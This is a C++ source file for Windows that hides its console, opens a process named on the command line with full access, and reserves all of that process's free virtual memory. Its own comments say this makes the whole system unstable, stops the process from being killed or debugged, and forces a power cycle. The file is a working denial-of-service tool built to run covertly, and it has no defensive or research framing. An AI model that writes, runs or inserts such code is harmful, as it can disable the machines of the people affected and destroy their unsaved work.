#include <Windows.h>
#include <stdio.h>
#include <type_traits>
#include <algorithm>
#include <numbers>
#include <chrono>
#include <thread>
#include <Windows.h>

#include "HebroHelper.h"


namespace pointer
{
	template <typename T>
	T AlignTop(const void* anyPointer, size_t alignment)
	{
		union
		{
			const void* as_void;
			uintptr_t as_uintptr_t;
			T as_T;
		};

		as_void = anyPointer;
		const size_t mask = alignment - 1u;
		as_uintptr_t += mask;
		as_uintptr_t &= ~mask;

		return as_T;
	}


	template <typename T, typename U>
	T Offset(void* anyPointer, U howManyBytes)
	{
		union
		{
			void* as_void;
			char* as_char;
			T as_T;
		};

		as_void = anyPointer;
		as_char += howManyBytes;

		return as_T;
	}
}

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

int main(int argc, char* argv[] )
{
	HideConsole();
	int pid = 0;
	pid = getPID(argv[1]);
	if (pid != 0) {
		HANDLE proc = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

		const size_t alignment = 64u * 1024u;

		// chosen to make the loop "overflow", starting from 0x0 again.
		// this will reserve every possible memory region in the target process.
		// once everything has been reserved, the call to ::VirtualAllocEx will hang and never return.
		// this creates instability across the whole Windows system, making it impossible to kill this process, or sometimes even start new processes.
		// Rebooting no longer works.
		// Debugging this process doesn't work.
		// A full power cycle is required!
		const void* addressStart = (const void*)0x00007FFF7FF00000;
		const void* addressEnd = (const void*)0x000080007FF00000;
		for (const void* address = addressStart; address < addressEnd; /* nothing */)
		{
			// align address to be scanned
			address = pointer::AlignTop<const void*>(address, alignment);

			::MEMORY_BASIC_INFORMATION memoryInfo = {};
			const size_t bytesReturned = ::VirtualQueryEx(proc, address, &memoryInfo, sizeof(::MEMORY_BASIC_INFORMATION));

			// we are only interested in free pages
			if ((bytesReturned > 0u) && (memoryInfo.State == MEM_FREE))
			{
				const size_t bytesLeft = abs((intptr_t*)addressEnd - (intptr_t*)memoryInfo.BaseAddress);
				const size_t size = std::min<size_t>(memoryInfo.RegionSize, bytesLeft);

				//printf("baseAddress: 0x%p, size: 0x%llX\n", memoryInfo.BaseAddress, size);
				void* baseAddress = ::VirtualAllocEx(proc, memoryInfo.BaseAddress, size, MEM_RESERVE, PAGE_NOACCESS);
				if (baseAddress)
				{
					//printf("Reserving virtual memory region at 0x%p with size 0x%llX\n", baseAddress, size);
				}
			}

			// keep on searching
			address = pointer::Offset<const void*>(memoryInfo.BaseAddress, memoryInfo.RegionSize);
		}

		::CloseHandle(proc);
		return 0;
	}


	
	return 0;
}


